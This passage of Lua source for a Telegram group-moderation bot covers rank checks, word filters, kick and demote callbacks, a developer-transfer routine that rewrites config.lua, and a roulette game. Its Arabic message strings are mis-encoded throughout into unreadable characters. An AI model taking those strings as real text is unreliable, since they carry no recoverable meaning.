mustafaTEAM end
--     Source Escobar     --
function RankChecking(user_id,chat_id)
if SudoId(user_id) then
var = true  
elseif tonumber(user_id) == tonumber(mustafa) then  
var = true  
elseif Devmfm:sismember(mustafa..'mfm:SecondSudo:', user_id) then
var = true  
elseif Devmfm:sismember(mustafa..'mfm:SudoBot:', user_id) then
var = true  
elseif Devmfm:sismember(mustafa..'mfm:ManagerAll:', user_id) then
var = true  
elseif Devmfm:sismember(mustafa..'mfm:AdminAll:', user_id) then
var = true  
elseif Devmfm:sismember(mustafa..'mfm:VipAll:', user_id) then
var = true  
elseif Devmfm:sismember(mustafa..'mfm:mfmConstructor:'..chat_id, user_id) then
var = true
elseif Devmfm:sismember(mustafa..'mfm:BasicConstructor:'..chat_id, user_id) then
var = true
elseif Devmfm:sismember(mustafa..'mfm:Constructor:'..chat_id, user_id) then
var = true  
elseif Devmfm:sismember(mustafa..'mfm:Managers:'..chat_id, user_id) then
var = true  
elseif Devmfm:sismember(mustafa..'mfm:Admins:'..chat_id, user_id) then
var = true  
elseif Devmfm:sismember(mustafa..'mfm:VipMem:'..chat_id, user_id) then  
var = true 
else  
var = false
end  
return var
end
function mfmDelAll(user_id,chat_id)
if SudoId(user_id) then
var = 'sudoid'  
elseif Devmfm:sismember(mustafa..'mfm:SecondSudo:', user_id) then
var = 'secondsudo' 
elseif Devmfm:sismember(mustafa..'mfm:SudoBot:', user_id) then
var = 'sudobot'  
elseif Devmfm:sismember(mustafa..'mfm:mfmConstructor:'..chat_id, user_id) then
var = 'mfmconstructor'
elseif Devmfm:sismember(mustafa..'mfm:BasicConstructor:'..chat_id, user_id) then
var = 'basicconstructor'
elseif Devmfm:sismember(mustafa..'mfm:Constructor:'..chat_id, user_id) then
var = 'constructor'
elseif Devmfm:sismember(mustafa..'mfm:Managers:'..chat_id, user_id) then
var = 'manager'  
else  
var = 'No'
end  
return var
end 
--     Source Escobar     --
local function Filters(msg, value)
local mfm = (mustafa..'mfm:Filters:'..msg.chat_id_)
if mfm then
local names = Devmfm:hkeys(mfm)
local value = value:gsub(' ','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source Escobar     --
function ReplyStatus(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,dp) 
if dp.first_name_ ~= false then
local UserName = (dp.username_ or "TEAM_Escobar")
for gmatch in string.gmatch(dp.first_name_, "[^%s]+") do
dp.first_name_ = gmatch
end
if status == "WrongWay" then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨΉΩΩΩΩΩΩΩΩΨ°Ψ±Ψ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "Reply" then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ β ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "ReplyBy" then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ¨ΩΩΩΩΨ’ΩΨ³ΩΩΩΨ·Ψ© β ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ§ΩΨ­Ψ³Ψ§Ψ¨ ΩΨ­Ψ°ΩΩ ΩΩ Ψ¨Ψ§ΩΨͺΨ§ΩΨ― ΩΨ§ΨΉΨ― Ψ§ΩΩΨ­Ψ§ΩΩΩ", 1, 'md')
end
end,nil)   
end
--     Source Escobar     --
function GetCustomTitle(user_id,chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..chat_id..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then 
Status = "Ψ§ΩΩΨ§ΩΩ"
elseif GetInfo.result.status == "administrator" then 
Status = "ΩΨ΄Ψ±Ω"
else
Status = false
end
if GetInfo.result.custom_title then 
mfm = GetInfo.result.custom_title
else 
mfm = Status
end
end
return mfm
end
function Validity(msg,user_id) 
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then
send(msg.chat_id_,msg.id_,'β β« ΩΨ§ΩΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©')   
return false  end 
if GetInfo.result.status == "member" then
send(msg.chat_id_,msg.id_,'β β« ΩΨ¬Ψ±Ψ― ΨΉΨΆΩΩΩΩ ΩΩΩΨ’')   
return false  end
if GetInfo.result.status == 'left' then
send(msg.chat_id_,msg.id_,'β β« Ψ’ΩΨ΄ΩΨ?ΩΨ΅ ΨΊΩΩΩ°Ωΰ’ͺ ΩΩΩΨ¬ΩΩΪ ΩΩΩΨ’')   
return false  end
if GetInfo.result.status == "administrator" then
if GetInfo.result.can_change_info == true then EDT = 'βοΈ' else EDT = 'βοΈ' end
if GetInfo.result.can_delete_messages == true then DEL = 'βοΈ' else DEL = 'βοΈ' end
if GetInfo.result.can_invite_users == true then INV = 'βοΈ' else INV = 'βοΈ' end
if GetInfo.result.can_pin_messages == true then PIN = 'βοΈ' else PIN = 'βοΈ' end
if GetInfo.result.can_restrict_members == true then BAN = 'βοΈ' else BAN = 'βοΈ' end
if GetInfo.result.can_promote_members == true then VIP = 'βοΈ' else VIP = 'βοΈ' end 
send(msg.chat_id_,msg.id_,'β β« Ψ΅ΩΨ§Ψ­ΩΨ§Ψͺ '..GetCustomTitle(user_id,msg.chat_id_)..' ΩΩ β β₯‘\nββββ EB ββββ\nβ β« Ψ­Ψ°Ω Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω β '..DEL..'\nβ β« Ψ―ΨΉΩΨ© Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ β '..INV..'\nβ β« Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ β '..BAN..'\nβ β« ΨͺΨ«Ψ¨ΩΨͺ Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω β '..PIN..'\nβ β« ΨͺΨΊΩΩΨ± Ψ§ΩΩΨΉΩΩΩΨ§Ψͺ β '..EDT..'\nβ β« Ψ§ΨΆΨ§ΩΨ© ΩΨ΄Ψ±ΩΩΩΩ°Ω β '..VIP..'\nββββ EB ββββ')
end
end
end
--     Source Escobar     --
function GetBio(chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..chat_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.bio then 
mfm = GetInfo.result.bio
else 
mfm = "ΩΨ§ ΩΩΨ¬Ψ―"
end
end
return mfm
end
--     Source Escobar     --
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({ ID = request_id, chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = input_message_content }, callback or dl_cb, extra)
end
local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
local input_message_content = { ID = "InputMessageDocument", document_ = getInputFile(document), caption_ = caption } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageVoice", voice_ = getInputFile(voice), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendAudio(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, audio, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageAudio", audio_ = getInputFile(audio), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, cb, cmd)    
local input_message_content = { ID = "InputMessageVideo",      video_ = getInputFile(video),      added_sticker_file_ids_ = {},      duration_ = duration or 0,      width_ = width or 0,      height_ = height or 0,      caption_ = caption    }    sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)  
end
local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
local input_message_content = { ID = "InputMessageSticker", sticker_ = getInputFile(sticker), width_ = 0, height_ = 0 } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end 
function formsgs(msgs) 
local MsgText = ''  
if tonumber(msgs) < 100 then 
MsgText = 'Ψ¬Ψ―Ψ§ ΨΆΨΉΩΩ' 
elseif tonumber(msgs) < 250 then 
MsgText = 'ΨΆΨΉΩΩ' 
elseif tonumber(msgs) < 500 then 
MsgText = 'ΨΊΩΨ± ΩΨͺΩΨ§ΨΉΩ' 
elseif tonumber(msgs) < 750 then 
MsgText = 'ΩΨͺΩΨ³Ψ·' 
elseif tonumber(msgs) < 1000 then 
MsgText = 'ΩΨͺΩΨ§ΨΉΩ' 
elseif tonumber(msgs) < 2000 then 
MsgText = 'ΩΩΨ© Ψ§ΩΨͺΩΨ§ΨΉΩ' 
elseif tonumber(msgs) < 3000 then 
MsgText = 'ΩΩΩ Ψ§ΩΨͺΩΨ§ΨΉΩ'  
elseif tonumber(msgs) < 4000 then 
MsgText = 'Ψ§Ψ³Ψ·ΩΨ±Ψ© Ψ§ΩΨͺΩΨ§ΨΉΩ' 
elseif tonumber(msgs) < 5000 then 
MsgText = 'ΩΨͺΩΨ§ΨΉΩ ΩΨ§Ψ±' 
elseif tonumber(msgs) < 6000 then 
MsgText = 'ΩΨ¬Ψ―Ψ­ Ψ¬Ψ―Ψ­' 
elseif tonumber(msgs) < 7000 then 
MsgText = 'Ψ?ΩΨ§ΩΩ' 
elseif tonumber(msgs) < 8000 then 
MsgText = 'Ψ±Ψ¨ Ψ§ΩΨͺΩΨ§ΨΉΩ' 
elseif tonumber(msgs) < 9000 then 
MsgText = 'ΩΨ§ΩΨ± Ψ¨Ψ§ΩΨͺΩΨ§ΨΉΩ' 
elseif tonumber(msgs) < 10000000000 then 
MsgText = "ΩΨΉΩΩ ΩΨ±Ψ¨Ω" 
end 
return MsgText
end
--     Source Escobar     --
function mfmmoned(chat_id, user_id, msg_id, text, offset, length) local tt = Devmfm:get(mustafa..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     Source Escobar     --
function ChCheck(msg)
local var = true 
if Devmfm:get(mustafa.."Devmfm2") then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..Devmfm:get(mustafa..'Devmfm2')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if Devmfm:get(mustafa..'mfm:textch:user') then
local textchuser = Devmfm:get(mustafa..'mfm:textch:user')
send(msg.chat_id_,msg.id_,'['..textchuser..']')
else
send(msg.chat_id_,msg.id_,"*β β«  ΨΉΩΩΩΩ°Ϊͺ Ψ’ΩΨ’Ψ΄ΩΨͺΩΰ’ͺΨ’Ϊͺ ΩΩΩΩ° ΩΩΨ’Ψ© Ψ’ΩΨ¨ΩΨͺ *\n*β β« ΩΩΨ’Ψ© Ψ’ΩΨ¨ΩΨͺ  β * ["..Devmfm:get(mustafa..'Devmfm3').."]")
end
elseif data.ok then
return var
end
else
return var
end
end
chats = {}
function tdcli_update_callback(data)
if (data.ID == "UpdateNewCallbackQuery") then
local Chat_Id2 = data.chat_id_
local MsgId2 = data.message_id_
local DataText = data.payload_.data_
local Msg_Id2 = data.message_id_/2097152/0.5
if DataText == '/delyes' and Devmfm:get(mustafa..'yes'..data.sender_user_id_) == 'delyes' then
Devmfm:del(mustafa..'yes'..data.sender_user_id_, 'delyes')
Devmfm:del(mustafa..'no'..data.sender_user_id_, 'delno')
if RankChecking(data.sender_user_id_, data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "*β β« ΩΨ’ Ψ’Ψ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ·Ωΰ’ͺΪ β * "..IdRank(data.sender_user_id_, data.chat_id_)) 
return false
end
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=data.chat_id_,user_id_=data.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,da) 
if (da and da.code_ and da.code_ == 400 and da.message_ == "CHAT_ADMIN_REQUIRED") then 
EditMsg(Chat_Id2, Msg_Id2, "*β β« ΩΩΨ³ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ ΩΨ±Ψ¬Ω ΨͺΩΨΉΩΩΩΨ§ !*") 
return false  
end
if (da and da.code_ and da.code_ == 3) then 
EditMsg(Chat_Id2, Msg_Id2, "*β β« Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !*") 
return false  
end
if da and da.code_ and da.code_ == 400 and da.message_ == "USER_ADMIN_INVALID" then 
EditMsg(Chat_Id2, Msg_Id2, "*β β« ΩΨ’ Ψ’Ψ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ·Ωΰ’ͺΪ ΩΩΨ΄ΩΩΰ’ͺΩΩΩΩ°Ω°Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*") 
return false  
end
if da and da.ID and da.ID == "Ok" then
ChatKick(data.chat_id_, data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "*β β« ΨͺΩΩΩΩ Ψ·Ωΰ’ͺΪΪͺ ΩΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*") 
return false
end
end,nil)  
end
if DataText == '/delno' and Devmfm:get(mustafa..'no'..data.sender_user_id_) == 'delno' then
Devmfm:del(mustafa..'yes'..data.sender_user_id_, 'delyes')
Devmfm:del(mustafa..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ± Ψ§Ψ·Ψ±Ψ―ΩΩ") 
end
--     Source Escobar     --
if DataText == '/yesdel' and Devmfm:get(mustafa..'yesdel'..data.sender_user_id_) == 'delyes' then
Devmfm:del(mustafa..'yesdel'..data.sender_user_id_, 'delyes')
Devmfm:del(mustafa..'nodel'..data.sender_user_id_, 'delno')
if Devmfm:sismember(mustafa..'mfm:Constructor:'..data.chat_id_, data.sender_user_id_) then
constructor = 'Ψ§ΩΩΩΨ΄Ψ¦ΩΩ β’ ' else constructor = '' end 
if Devmfm:sismember(mustafa..'mfm:Managers:'..data.chat_id_, data.sender_user_id_) then
Managers = 'Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ β’ ' else Managers = '' end
if Devmfm:sismember(mustafa..'mfm:Admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'Ψ§ΩΨ§Ψ―ΩΩΩΩ β’ ' else admins = '' end
if Devmfm:sismember(mustafa..'mfm:VipMem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'Ψ§ΩΩΩΩΨ²ΩΩ β’ ' else vipmem = '' end
if Devmfm:sismember(mustafa..'mfm:Cleaner:'..data.chat_id_, data.sender_user_id_) then
cleaner = 'Ψ§ΩΩΩΨΈΩΩΩΩ°Ω β’ ' else cleaner = '' end
if Devmfm:sismember(mustafa..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'Ψ§ΩΩΨ·Ψ§ΩΩ β’ ' else donky = '' end
if Devmfm:sismember(mustafa..'mfm:Constructor:'..data.chat_id_, data.sender_user_id_) or Devmfm:sismember(mustafa..'mfm:Managers:'..data.chat_id_, data.sender_user_id_) or Devmfm:sismember(mustafa..'mfm:Admins:'..data.chat_id_, data.sender_user_id_) or Devmfm:sismember(mustafa..'mfm:VipMem:'..data.chat_id_, data.sender_user_id_) or Devmfm:sismember(mustafa..'mfm:Cleaner:'..data.chat_id_, data.sender_user_id_) or Devmfm:sismember(mustafa..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
Devmfm:srem(mustafa..'mfm:Constructor:'..data.chat_id_,data.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Managers:'..data.chat_id_,data.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Admins:'..data.chat_id_,data.sender_user_id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..data.chat_id_,data.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Cleaner:'..data.chat_id_,data.sender_user_id_)
Devmfm:srem(mustafa..'User:Donky:'..data.chat_id_,data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩΩ ΩΩΩ β β₯‘ *\n~ ( "..constructor..''..Managers..''..admins..''..vipmem..''..cleaner..''..donky.." ) ~ \n"  ) 
else 
if IdRank(data.sender_user_id_, data.chat_id_) == 'Ψ’ΩΩΨΉΨΆΩΩΩΩ' then
EditMsg(Chat_Id2, Msg_Id2, "*β β« ΩΩΨ³ ΩΨ―ΩΩ Ψ±ΨͺΨ¨Ω ΩΩΩΩ° Ψ§ΩΨ¨ΩΨͺ β οΈπ°*") 
else 
EditMsg(Chat_Id2, Msg_Id2, "*β β« ΩΨ§ Ψ’Ψ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΨͺΩΨ²ΩΩ β οΈπ° β * "..IdRank(data.sender_user_id_, data.chat_id_)) 
end
end
end
if Devmfm:get(mustafa.."mfm:NewDev"..data.sender_user_id_) then
if DataText == '/setno' then
EditMsg(Chat_Id2, Msg_Id2, "β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ± ΨͺΨΊΩΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω") 
Devmfm:del(mustafa.."mfm:NewDev"..data.sender_user_id_)
return false
end
if DataText == '/setyes' then
local NewDev = Devmfm:get(mustafa.."mfm:NewDev"..data.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = NewDev},function(arg,dp) 
EditMsg(Chat_Id2, Msg_Id2, "*β β« Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ¬Ψ―ΩΨ― β * ["..dp.first_name_.."](tg://user?id="..dp.id_..")\n*β β« ΨͺΩ ΨͺΨΊΩΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω Ψ¨ΩΨ¬Ψ§Ψ­*") 
end,nil)
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,dp) 
SendText(NewDev,"*β β« Ψ¨ΩΨ§Ψ³Ψ·Ψ© β β * ["..dp.first_name_.."](tg://user?id="..dp.id_..")\n*β β« ΩΩΨ― Ψ§Ψ΅Ψ¨Ψ­Ψͺ Ψ§ΩΨͺ ΩΨ·ΩΨ± ΩΨ°Ψ§ Ψ§ΩΨ¨ΩΨͺ*",0,'md')end,nil)
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
Config = {
DevId = NewDev,
TokenBot = TokenBot,
mustafa = TokenBot:match("(%d+)"),
SudoIds = {NewDev},
}
Create(Config, "./config.lua")  
Devmfm:del(mustafa.."mfm:NewDev"..data.sender_user_id_)
dofile('Escobar.lua') 
end
end
if DataText == '/nodel' and Devmfm:get(mustafa..'nodel'..data.sender_user_id_) == 'delno' then
Devmfm:del(mustafa..'yesdel'..data.sender_user_id_, 'delyes')
Devmfm:del(mustafa..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "*β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ± ΩΨ²ΩΩΩ*") 
end
if DataText == '/YesRolet' and Devmfm:get(mustafa.."mfm:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
local List = Devmfm:smembers(mustafa..'mfm:ListRolet'..data.chat_id_) 
local UserName = List[math.random(#List)]
tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
Devmfm:incrby(mustafa..'mfm:GamesNumber'..data.chat_id_..dp.id_, 5) 
end,nil) 
Devmfm:del(mustafa..'mfm:ListRolet'..data.chat_id_) 
Devmfm:del(mustafa.."mfm:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "β β« *Ψ΅Ψ§Ψ­Ψ¨ Ψ§ΩΨ­ΨΈ* β ["..UserName.."]\nβ β« *ΩΨ¨ΩΩΩΨ±ΩΩΪͺ ΩΩΪ Ωΰ’ͺΨ¨Ψ­ΩΨͺ ΩΨ­Ψ΅ΩΨͺ ΨΉΩΩ 5 ΩΩΨ§Ψ· ΩΩΩΩΩ Ψ§Ψ³ΨͺΨ¨Ψ―Ψ§ΩΩΨ§ Ψ¨Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω*")
end
if DataText == '/NoRolet' then
Devmfm:del(mustafa..'mfm:ListRolet'..data.chat_id_) 
Devmfm:del(mustafa.."mfm:NumRolet"..data.chat_id_..data.sender_user_id_) 
Devmfm:del(mustafa.."mfm:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "*β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ’ΩΩΨΉΨ¨ΩΩΩΩΫ π? ΩΨ§ΨΉΨ§Ψ―Ψ© Ψ§ΩΩΨΉΨ¨ Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ§ΩΨ§ΩΨΉΨ§Ψ¨*") 
end
if DataText == '/ListRolet' then
local List = Devmfm:smembers(mustafa..'mfm:ListRolet'..data.chat_id_) 
local Text = '*β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΨ’ΨΉΩΨ¨ΩΩ°Ω β β₯‘*\nββββ EB ββββ\n' 
local Textt = 'ββββ EB ββββ\n*β β« ΨͺΩΩΩΩ Ψ§ΩΨͺΩΨ§Ω Ψ§ΩΨΉΨ―Ψ― Ψ§ΩΩΩΩ ΩΩ Ψ§ΩΨͺ ΩΨ³ΨͺΨΉΨ― Ψ*'
for k, v in pairs(List) do 
Text = Text..k.."~ : [" ..v.."]\n"  
end 
keyboard = {} 
keyboard.inline_keyboard = {{{text="ΩΨΉΩ",callback_data="/YesRolet"},{text="ΩΨ§",callback_data="/NoRolet"}}} 
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text..Textt).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if DataText == '/UnTkeed' then
if Devmfm:sismember(mustafa..'mfm:Tkeed:'..Chat_Id2, data.sender_user_id_) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..Chat_Id2.."&user_id="..data.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Devmfm:srem(mustafa..'mfm:Tkeed:'..Chat_Id2, data.sender_user_id_)
DeleteMessage(Chat_Id2,{[0] = MsgId2})
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("β ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΨ―Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ Ψ¨ΩΨ¬Ψ§Ψ­ .")..'&show_alert=true')
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("β ΨΉΨ°Ψ±Ψ§ ΩΨ°Ψ§ Ψ§ΩΨ§ΩΨ± ΩΩΨ΄Ω Ψ§ΩΨ±ΩΨ¨ΩΨͺ ΩΩΩΨ³ ΩΩ .")..'&show_alert=true')
end 
end
end
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
text = msg.content_.text_ 
if text and Devmfm:get(mustafa.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = Devmfm:get(mustafa.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
Devmfm:del(mustafa.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
Devmfm:del(mustafa.."Set:Cmd:Group:New"..msg.chat_id_)
Devmfm:srem(mustafa.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω Ψ§ΩΨ§ΩΨ± ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©", 1, 'html')  
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΩΨ§ΩΩΨ¬Ψ― Ψ§ΩΨ± Ψ¨ΩΨ°Ψ§ Ψ§ΩΨ§Ψ³Ω", 1, 'html')
end
Devmfm:del(mustafa.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text and text:match('^'..(Devmfm:get(mustafa..'mfm:NameBot') or "Ψ§Ψ³ΩΩΨ¨Ψ§Ψ±")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(Devmfm:get(mustafa..'mfm:NameBot') or "Ψ§Ψ³ΩΩΨ¨Ψ§Ψ±")..' ','')
end
if data.message_.content_.text_ then
local NewCmmd = Devmfm:get(mustafa.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if text and Devmfm:get(mustafa.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
Devmfm:set(mustafa.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ¬Ψ―ΩΨ―", 1, 'html')
Devmfm:del(mustafa.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
Devmfm:set(mustafa.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and Devmfm:get(mustafa.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = Devmfm:get(mustafa.."Set:Cmd:Group:New"..msg.chat_id_)
Devmfm:set(mustafa.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
Devmfm:sadd(mustafa.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ­ΩΨΈ Ψ§ΩΨ§ΩΨ±", 1, 'html')
Devmfm:del(mustafa.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if Constructor(msg) then
if text == "Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨΆΨ§ΩΩ" and ChCheck(msg) then
local List = Devmfm:smembers(mustafa.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "*β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΨ’ΩΨ’ΩΩΰ’ͺ Ψ’ΩΩΩΨΆΨ’ΩΨ© β β₯‘ *\nββββ EB ββββ\n"
for k,v in pairs(List) do
Cmds = Devmfm:get(mustafa.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..""..k.."~ ("..v..") β’ {"..Cmds.."}\n"
else
t = t..""..k.."~ ("..v..") \n"
end
end
if #List == 0 then
t = "*β β« ΩΨ§ΨͺΩΨ¬Ψ― Ψ§ΩΨ§ΩΨ± ΩΨΆΨ§ΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
